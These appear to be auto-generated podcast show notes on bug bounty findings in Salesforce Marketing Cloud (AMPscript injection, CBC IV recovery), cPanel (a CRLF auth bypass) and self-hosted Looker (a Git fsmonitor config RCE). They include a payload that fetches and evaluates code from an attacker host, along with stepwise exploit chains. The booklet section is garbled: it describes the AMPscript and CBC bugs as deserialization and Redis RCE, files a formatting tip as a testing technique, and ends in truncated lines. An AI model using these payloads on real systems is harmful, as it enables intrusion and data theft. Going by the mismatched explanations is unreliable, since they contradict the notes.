---
title: "Saving Bug Bounty Programs + AMPScript, tessl & GPT-5.5"
episode: 174
---


# Episode 174 Saving Bug Bounty Programs + AMPScript, tessl & GPT-5.5

### TL;DR
- Salesforce Marketing Cloud AMPscript injection: double evaluation via `TreatAsContent()` + `HTTPGET()` bypasses length limits
- CBC bit-flipping attack on Salesforce encrypted QS parameter — 8-null-byte trick to recover IV, then decrypt arbitrary content
- cPanel auth bypass (CVE-2026-41940): CRLF injection via combining cookie and auth header → session file pollution → pre-auth session takeover
- Git RCE trick: if `.git` is deleted, next `git` command looks for config in worktree root — forge `.git/config` for arbitrary command execution
- Skill optimization: use `description: >-` in frontmatter (not multi-line); use snake_case, avoid "Claude" in skill names

### Key Takeaways
- [ ] AMPscript injection: when limited by payload length, host payload on external server and fetch via `HTTPGET()` + `TreatAsContent()` for unlimited eval
- [ ] CBC bit-flip trick: pad first ciphertext block with 8 null bytes → recover IV, then brute-force remaining IV bits against known plaintext
- [ ] cPanel auth bypass chain: combine cookie + auth header to smuggle CRLF → inject session attributes → pre-auth session takeover
- [ ] Git RCE: delete `.git` directory, then forge `config` file in worktree root with `fsmonitor` hook → arbitrary command execution on next `git status`
- [ ] Use `description: >-` (greater-than dash) in skill frontmatter for multi-line descriptions that actually get parsed

### Bugs and Findings

#### Salesforce Marketing Cloud — AMPscript Double-Eval Template Injection
- **Target/context:** Salesforce Marketing Cloud email templates
- **Root cause:** AMPscript `TreatAsContent()` evaluates its argument as AMPscript; `HTTPGET()` fetches remote content; combined, unlimited-length secondary injection
- **Technique:** `%%=TreatAsContent(HTTPGET("https://attacker.com/payload"))=%%` — fetches more AMPscript from attacker server, then evaluates it
- **Key technical details:** `{{=` triggers AMPscript evaluation; 50-char limit bypassed by chaining `HTTPGET` → `TreatAsContent`; email subject line injection
- **Impact / severity / bounty:** Full email content exfiltration; database data leak via personalization fields

#### Salesforce Marketing Cloud — CBC Bit-Flipping IV Recovery
- **Target/context:** Salesforce Marketing Cloud "View in Browser" encrypted QS parameter
- **Root cause:** Unauthenticated AES-CBC encryption; IV can be recovered via null-byte padding trick
- **Technique:** 1) Pad first ciphertext block with 8 null bytes 2) Output of decrypt(null_bytes) XORed with IV gives junk; second block decrypts to raw plaintext of original first block 3) Brute-force IV against known plaintext (from Stack Overflow reference) 4) Once IV is known, decrypt arbitrary content
- **Key technical details:** 8 null-byte first block trick; `Padre` tool for padding oracle attacks; IV recovery via known-plaintext brute force across multiple valid IDs
- **Impact / severity / bounty:** Decrypt arbitrary email content for any Salesforce Marketing Cloud customer

#### cPanel Auth Bypass (CVE-2026-41940)
- **Target/context:** cPanel/WHM
- **Root cause:** Auth material written to disk at `/var/cpanel/sessions/raw/<session_id>` in CRLF-delimited format; CRLF injection via combined cookie+auth header smuggling
- **Technique:** 1) Submit invalid username/password to get pre-auth session 2) Smuggle CRLF via combining Cookie and Authorization headers 3) Inject arbitrary attributes into session file 4) Cache invalidation bypass to force raw file reload 5) Bypass defense-in-depth password re-check
- **Key technical details:** Two auth methods combined for CRLF injection; file format is `\r\n` delimited key-value; cached JSON version preferred over raw file — need cache-invalidation primitive
- **Impact / severity / bounty:** Pre-auth → full authentication bypass

#### Git RCE via Deleted .git Directory (Ryotak's Flatt Research)
- **Target/context:** Google Cloud Looker (self-hosted)
- **Root cause:** If `.git` directory is deleted, `git` commands search for config in worktree root; forge a `config` file with `fsmonitor` hook → arbitrary command execution
- **Technique:** 1) Upload a repository with a massive folder (thousands of files) 2) Trigger delete of entire repo directory 3) Ruby `rm -rf` deletes `.git` first, then slowly processes large folder 4) During deletion, hit `git status` via separate endpoint — git finds `config` in worktree root instead 5) Config has `[core] fsmonitor = "malicious command"` → RCE
- **Key technical details:** ExFAT filesystem nuances; race window between `.git` deletion and completion of recursive `rm -rf`; `git` falls back to worktree-root config when `.git` is absent; privilege escalation via K8s service account at `/var/run/secrets/kubernetes.io/service_account`
- **Impact / severity / bounty:** RCE on Google Cloud production server; full cluster compromise via excessive SA permissions

### Techniques and Primitives
- **AMPscript payload length bypass** — `%%=TreatAsContent(HTTPGET("..."))=%%` fetches unlimited-length secondary payload
- **CBC null-byte IV recovery** — 8 null bytes in first ciphertext block to recover IV; brute-force IV against known plaintext across multiple IDs
- **cPanel session CRLF injection** — Combine two auth methods (cookie + header) to smuggle CRLF into session file
- **Git config fallback RCE** — Delete `.git/` → forge `config` with fsmonitor hook → RCE on next git command
- **Skill description formatting** — `description: >-` for multi-line; snake_case names; avoid "Claude" in skill names
- **Tessl Skill Optimizer** — External tool that evaluates skill invocation rates and optimizes descriptions

### Tooling and Resources
- Padre — padding oracle/CBC attack tool
- SL Cyber cPanel auth bypass high-fidelity checker
- WatchTower write-up: "The Internet Is Falling Down" — cPanel auth bypass
- Tessl Skill Optimizer: tessl.io
- XSS Doctor / Starstrike: "Achieving Deterministic Prompt Injection Through Client-Side Feedback Loops"
- Flatt Research: "Remote Command Execution in Google Cloud with Single Directory Deletion"
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
Salesforce Marketing Cloud AMPscript injection: double evaluation via `TreatAsContent()` + `HTTPGET()` bypasses length limits

#### 2. What you should learn
- Understand **[ ] ampscript injection: when limited by payload length, host payload on external server and fetch via `httpget()` + `treatascontent()` for unlimited eval**
- Understand **[ ] cbc bit-flip trick: pad first ciphertext block with 8 null bytes → recover iv, then brute-force remaining iv bits against known plaintext**
- Understand **[ ] cpanel auth bypass chain: combine cookie + auth header to smuggle crlf → inject session attributes → pre-auth session takeover**
- Understand **[ ] git rce: delete `.git` directory, then forge `config` file in worktree root with `fsmonitor` hook → arbitrary command execution on next `git status`**
- Understand **[ ] use `description: >-` (greater-than dash) in skill frontmatter for multi-line descriptions that actually get parsed**

#### 3. Core concepts explained
**Salesforce Marketing Cloud — AMPscript Double-Eval Template Injection**
- **What it is:** Remote Code Execution via deserialization — attacker-controlled data is deserialized by the server, triggering code execution through object injection or gadget chains.
- **Why it matters:** Deserialization RCE is typically critical severity. It often requires chaining multiple primitives (object injection → Redis injection → RCE).
- **Common mistake:** Giving up when direct exploitation is blocked — look for pivoting techniques like Redis SLAVEOF replication.

**Salesforce Marketing Cloud — CBC Bit-Flipping IV Recovery**
- **What it is:** Remote Code Execution via deserialization — attacker-controlled data is deserialized by the server, triggering code execution through object injection or gadget chains.
- **Why it matters:** Deserialization RCE is typically critical severity. It often requires chaining multiple primitives (object injection → Redis injection → RCE).
- **Common mistake:** Giving up when direct exploitation is blocked — look for pivoting techniques like Redis SLAVEOF replication.

**cPanel Auth Bypass (CVE-2026-41940)**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**AMPscript payload length bypass**
- `%%=TreatAsContent(HTTPGET("..."))=%%` fetches unlimited-length secondary payload

**CBC null-byte IV recovery**
- 8 null bytes in first ciphertext block to recover IV; brute-force IV against known plaintext across multiple IDs

**cPanel session CRLF injection**
- Combine two auth methods (cookie + header) to smuggle CRLF into session file


#### 4. Techniques and tactics
**AMPscript payload length bypass**
- **What it is:** `%%=TreatAsContent(HTTPGET("..."))=%%` fetches unlimited-length secondary payload
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**CBC null-byte IV recovery**
- **What it is:** 8 null bytes in first ciphertext block to recover IV; brute-force IV against known plaintext across multiple IDs
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**cPanel session CRLF injection**
- **What it is:** Combine two auth methods (cookie + header) to smuggle CRLF into session file
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Git config fallback RCE**
- **What it is:** Delete `.git/` → forge `config` with fsmonitor hook → RCE on next git command
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Skill description formatting**
- **What it is:** `description: >-` for multi-line; snake_case names; avoid "Claude" in skill names
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"The best bugs come from persistence and deep understanding of the target"*
- *"Always think about what the worst thing that could happen is"*
- *"Don't be afraid to spend time on a single target"*

#### 6. Mental models
- **Think like an attacker** — Always consider the worst-case impact of a vulnerability. What would a malicious actor do with this access?
- **Persistence pays off** — The best bugs often come from spending deep time on a single target rather than skimming many targets.
- **Follow the data** — Track how user input flows through the application. Sources (inputs) lead to sinks (dangerous operations).

#### 7. Real-world application
- **Try this:** [ ] AMPscript injection: when limited by payload length, host payload on external server and fetch via `HTTPGET()` + `TreatAsContent()` for unlimited eval
- **Try this:** [ ] CBC bit-flip trick: pad first ciphertext block with 8 null bytes → recover IV, then brute-force remaining IV bits against known plaintext
- **Try this:** [ ] cPanel auth bypass chain: combine cookie + auth header to smuggle CRLF → inject session attributes → pre-auth session takeover
- **Try this:** [ ] Git RCE: delete `.git` directory, then forge `config` file in worktree root with `fsmonitor` hook → arbitrary command execution on next `git status`

#### 8. Red flags and pitfalls
- **Giving up too early** — Many bugs require creative pivoting when initial exploitation paths are blocked
- **Ignoring blind vulnerabilities** — Blind SSRF, blind XSS, and timing-based attacks can be just as impactful as visible ones
- **Missing the forest for the trees** — Don't get tunnel vision on one vulnerability class; step back and consider the full attack surface

#### 9. Vocabulary
- **RCE** — Remote Code Execution — running arbitrary code on a target server

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in Salesforce Marketing Cloud — AMPscript Double-Eval Template Injection?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **Salesforce Marketing Cloud AMPscript injection: double evaluation via `TreatAsCo**
2. **[ ] AMPscript injection: when limited by payload length, host payload on externa**
3. **[ ] CBC bit-flip trick: pad first ciphertext block with 8 null bytes → recover I**
